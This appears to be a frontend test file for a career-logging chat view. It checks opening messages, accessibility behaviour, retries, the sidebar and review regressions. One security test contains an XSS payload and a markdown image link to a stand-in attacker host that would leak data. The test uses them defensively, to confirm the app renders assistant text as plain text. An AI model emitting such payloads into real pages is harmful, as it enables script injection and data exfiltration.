import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, describe, expect, it, vi } from "vitest";

import { Chat } from "./Chat";
import { stubFetch } from "../test/http";
import type { Entry } from "../lib/api";

/**
 * The Log view (v1.1 slice 2).
 *
 * Two things are worth testing here and neither is visual. The **accessibility contract** — audit
 * findings A4–A7 — is invisible to typecheck, build and lint alike, and equally invisible to looking
 * at the page: a live region that has stopped announcing looks exactly like one that works. And the
 * **derived opening question**, which deviates from the handoff by measuring elapsed time rather
 * than assuming it, is a claim about the user's own history that must not be able to go stale.
 */

const DAY = 86_400_000;

function entry(over: Partial<Entry> = {}): Entry {
  return {
    entry_id: "01JQ0000000000000000000001",
    entry_type: "CERT",
    title: "AZ-900",
    content: "Passed the exam.",
    issuer: "Microsoft",
    event_date: "2026-03-14",
    created_at: new Date(Date.now() - 3 * DAY).toISOString(),
    ...over,
  } as Entry;
}

function renderLog(props: Partial<Parameters<typeof Chat>[0]> = {}) {
  const onEntrySaved = vi.fn();
  render(
    <Chat
      idToken="tok"
      entries={[entry()]}
      cadence="weekly"
      onEntrySaved={onEntrySaved}
      {...props}
    />,
  );
  return { onEntrySaved, user: userEvent.setup() };
}

const input = () => screen.getByLabelText(/tell me what happened/i);
const sendButton = () => screen.getByRole("button", { name: /send message/i });

afterEach(() => {
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
});

describe("the opening question (deviation from the handoff)", () => {
  it("measures how long it has actually been, rather than asserting the cadence", () => {
    // The handoff hardcodes "It's been a week…" for weekly. Someone who logged yesterday must not
    // be told it has been a week — the check-in would open by misstating their own history.
    stubFetch({ status: 200, body: {} });
    renderLog({ entries: [entry({ created_at: new Date(Date.now() - DAY).toISOString() })] });

    expect(screen.getByText(/it's been a day since you logged AZ-900/i)).toBeInTheDocument();
  });

  it("says something different entirely for an entry logged today", () => {
    stubFetch({ status: 200, body: {} });
    renderLog({ entries: [entry({ created_at: new Date().toISOString() })] });

    expect(screen.getByText(/you logged AZ-900 today/i)).toBeInTheDocument();
    expect(screen.queryByText(/it's been/i)).not.toBeInTheDocument();
  });

  it("opens on an empty vault without naming an entry that does not exist", () => {
    stubFetch({ status: 200, body: {} });
    renderLog({ entries: [] });

    expect(screen.getByText(/nothing in the vault yet/i)).toBeInTheDocument();
  });
});

describe("accessibility (audit §A4–A7)", () => {
  it("§A4 — the transcript is a live region, so replies are announced", () => {
    stubFetch({ status: 200, body: {} });
    renderLog();

    const log = screen.getByRole("log", { name: /conversation/i });
    expect(log).toHaveAttribute("aria-live", "polite");
  });

  it("§A5 — each message says who it came from, not just which side it sits on", async () => {
    stubFetch({ status: 200, body: { kind: "answer", answer: "Four certs.", session_id: "s1" } });
    const { user } = renderLog();

    await user.type(input(), "how many certs?");
    await user.click(sendButton());

    expect(await screen.findByText("Four certs.")).toBeInTheDocument();
    // Roles are exposed as text, so a screen reader announces them; alignment conveys nothing.
    expect(screen.getByText("You said:")).toBeInTheDocument();
    expect(screen.getByText("CareerVault said:")).toBeInTheDocument();
  });

  it("§A6 — the typing indicator announces words, not a literal ellipsis", async () => {
    // Never resolves: the pending state is the thing under test.
    vi.stubGlobal("fetch", () => new Promise(() => {}));
    const { user } = renderLog();

    await user.type(input(), "hello");
    await user.click(sendButton());

    const status = await screen.findByRole("status");
    expect(status).toHaveTextContent(/careervault is thinking/i);
  });

  it("§A7 — retry names the message it will resend", async () => {
    stubFetch({ networkError: true });
    const { user } = renderLog();

    await user.type(input(), "I shipped the migration");
    await user.click(sendButton());

    // Not a bare "Retry" among other buttons — it says which message.
    expect(
      await screen.findByRole("button", { name: /retry sending: I shipped the migration/i }),
    ).toBeInTheDocument();
  });

  it("§A7 — the retry reuses the same client_message_id (ADR-032), so it cannot duplicate", async () => {
    const calls = stubFetch({ networkError: true });
    const { user } = renderLog();

    await user.type(input(), "I shipped it");
    await user.click(sendButton());

    const retry = await screen.findByRole("button", { name: /retry sending/i });
    await user.click(retry);

    await waitFor(() => expect(calls.length).toBe(2));
    expect(calls[0].body?.client_message_id).toBe(calls[1].body?.client_message_id);
  });
});

describe("the composer hand-off from Home", () => {
  it("auto-sends the seeded draft exactly once", async () => {
    const calls = stubFetch({ status: 200, body: { kind: "answer", answer: "ok", session_id: "s" } });
    renderLog({ initialDraft: "I shipped the migration" });

    await waitFor(() => expect(calls).toHaveLength(1));
    expect(calls[0].body?.message).toBe("I shipped the migration");
    // The guard matters: StrictMode double-invokes effects, and without it the user's first
    // message would be sent twice.
    await new Promise((r) => setTimeout(r, 20));
    expect(calls).toHaveLength(1);
  });

  it("leaves the composer empty afterwards rather than re-showing the sent text", async () => {
    stubFetch({ status: 200, body: { kind: "answer", answer: "ok", session_id: "s" } });
    renderLog({ initialDraft: "already sent" });

    await waitFor(() => expect(input()).toHaveValue(""));
  });
});

describe("the activity sidebar", () => {
  it("lists only what was logged in the current period", () => {
    stubFetch({ status: 200, body: {} });
    renderLog({
      entries: [
        entry({ entry_id: "a", title: "This week", created_at: new Date().toISOString() }),
        entry({
          entry_id: "b",
          title: "Long ago",
          created_at: new Date(Date.now() - 90 * DAY).toISOString(),
        }),
      ],
    });

    const aside = screen.getByRole("complementary", { name: /activity/i });
    expect(within(aside).getByText("This week")).toBeInTheDocument();
    expect(within(aside).queryByText("Long ago")).not.toBeInTheDocument();
  });

  it("can be hidden and restored", async () => {
    stubFetch({ status: 200, body: {} });
    const { user } = renderLog();

    await user.click(screen.getByRole("button", { name: /hide activity/i }));
    expect(screen.queryByRole("complementary", { name: /activity/i })).not.toBeInTheDocument();

    await user.click(screen.getByRole("button", { name: /show activity/i }));
    expect(screen.getByRole("complementary", { name: /activity/i })).toBeInTheDocument();
  });
});

describe("security (B-012 / ADR-038)", () => {
  it("renders assistant text as a text node, never as markup", async () => {
    // Entry content can originate in an uploaded résumé, so an answer synthesised from it is not
    // fully trusted. A markdown renderer here would reopen an exfiltration channel.
    const poisoned = 'Look: <img src=x onerror="alert(1)"> ![](https://attacker/?d=leak)';
    stubFetch({ status: 200, body: { kind: "answer", answer: poisoned, session_id: "s1" } });
    const { user } = renderLog();

    await user.type(input(), "tell me");
    await user.click(sendButton());

    // The markup is visible *as characters*, which is exactly the point.
    expect(await screen.findByText(poisoned)).toBeInTheDocument();
    expect(document.querySelector("img")).toBeNull();
  });
});

/** Regressions from the v1.1 slice 2 code review. */
describe("slice 2 review regressions", () => {
  it("the composer preserves newlines — it is the primary FR-2 ingestion path", async () => {
    // Was an <input type="text">, which silently collapses newlines on paste, so what reached
    // POST /chat was not what the user wrote.
    const calls = stubFetch({ status: 200, body: { kind: "answer", answer: "ok", session_id: "s" } });
    const { user } = renderLog();

    const box = input();
    expect(box.tagName).toBe("TEXTAREA");
    await user.click(box);
    await user.paste("Line one\nLine two");
    await user.click(sendButton());

    await waitFor(() => expect(calls).toHaveLength(1));
    expect(calls[0].body?.message).toBe("Line one\nLine two");
  });

  it("Shift+Enter inserts a newline instead of sending", async () => {
    const calls = stubFetch({ status: 200, body: { kind: "answer", answer: "ok", session_id: "s" } });
    const { user } = renderLog();

    await user.click(input());
    await user.keyboard("first{Shift>}{Enter}{/Shift}second");

    expect(calls).toHaveLength(0);
    expect(input()).toHaveValue("first\nsecond");
  });

  it("the save note counts the entry just saved, and never rewrites itself afterwards", async () => {
    // Two bugs in one line. Reading `rows.length` live understated by one for the duration of the
    // shell's ~3.6s refetch, and — worse — a second save silently rewrote the *first* confirmation,
    // changing a message the user had already read.
    const calls = stubFetch(
      { status: 200, body: { kind: "parse_candidate", session_id: "s", candidate: { entry_id: "new-1", entry_type: "MILESTONE", title: "A talk", content: "Gave a talk." } } },
      { status: 201, body: { entry: { entry_id: "new-1" } } },
    );
    const onEntrySaved = vi.fn();
    const { rerender } = render(
      <Chat
        idToken="tok"
        entries={[entry({ entry_id: "a" }), entry({ entry_id: "b" })]}
        cadence="weekly"
        onEntrySaved={onEntrySaved}
      />,
    );
    const user = userEvent.setup();

    await user.click(screen.getByLabelText(/tell me what happened/i));
    await user.paste("I gave a talk");
    await user.click(screen.getByRole("button", { name: /send message/i }));
    await user.click(await screen.findByRole("button", { name: /confirm & save/i }));

    // 2 in the corpus + the one just saved, stated immediately rather than after the refetch.
    const note = await screen.findByText(/that is 3 records on deposit/i);
    expect(onEntrySaved).toHaveBeenCalled();
    expect(calls).toHaveLength(2);

    // The shell's refetch lands with the new entry included; the already-read message must not move.
    rerender(
      <Chat
        idToken="tok"
        entries={[entry({ entry_id: "a" }), entry({ entry_id: "b" }), entry({ entry_id: "new-1" })]}
        cadence="weekly"
        onEntrySaved={onEntrySaved}
      />,
    );
    expect(note).toHaveTextContent(/that is 3 records on deposit/i);
  });

  it("the sidebar shows a role's employer, not the literal 'JOB'", () => {
    // `organization || issuer || entry_type` fell through to the type for JOB and EDUCATION rows.
    stubFetch({ status: 200, body: {} });
    renderLog({
      entries: [
        entry({
          entry_id: "j",
          entry_type: "JOB",
          title: "Senior Associate",
          employer: "KPMG US",
          issuer: undefined,
          created_at: new Date().toISOString(),
        }),
      ],
    });

    const aside = screen.getByRole("complementary", { name: /activity/i });
    expect(within(aside).getByText("KPMG US")).toBeInTheDocument();
    expect(within(aside).queryByText("JOB")).not.toBeInTheDocument();
  });
});
